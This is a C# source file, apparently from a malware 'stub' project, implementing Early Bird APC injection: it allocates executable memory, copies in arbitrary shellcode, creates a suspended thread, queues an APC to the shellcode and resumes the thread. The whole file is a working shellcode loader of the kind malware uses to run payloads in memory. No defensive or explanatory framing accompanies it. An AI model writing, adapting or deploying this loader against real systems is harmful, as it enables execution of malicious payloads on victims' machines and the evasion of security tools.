using System;
using System.Runtime.InteropServices;

namespace NRE.Stub.Execution
{
    /// <summary>
    /// Early Bird APC injection: queue APC to a newly created suspended thread, then resume.
    /// </summary>
    public static class EarlyBird
    {
        private const uint CREATE_SUSPENDED = 0x00000004;
        private const uint MEM_COMMIT = 0x1000;
        private const uint MEM_RESERVE = 0x2000;
        private const uint PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll")]
        private static extern uint QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

        [DllImport("kernel32.dll")]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CloseHandle(IntPtr hObject);

        public static bool Execute(byte[] shellcode)
        {
            if (shellcode == null || shellcode.Length == 0) return false;
            IntPtr buf = VirtualAlloc(IntPtr.Zero, (UIntPtr)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (buf == IntPtr.Zero) return false;
            try
            {
                Marshal.Copy(shellcode, 0, buf, shellcode.Length);
                uint tid;
                IntPtr hThread = CreateThread(IntPtr.Zero, UIntPtr.Zero, buf, IntPtr.Zero, CREATE_SUSPENDED, out tid);
                if (hThread == IntPtr.Zero) return false;
                try
                {
                    if (QueueUserAPC(buf, hThread, IntPtr.Zero) == 0) return false;
                    if (ResumeThread(hThread) == unchecked((uint)-1)) return false;
                }
                finally
                {
                    CloseHandle(hThread);
                }
                return true;
            }
            finally { }
        }
    }
}
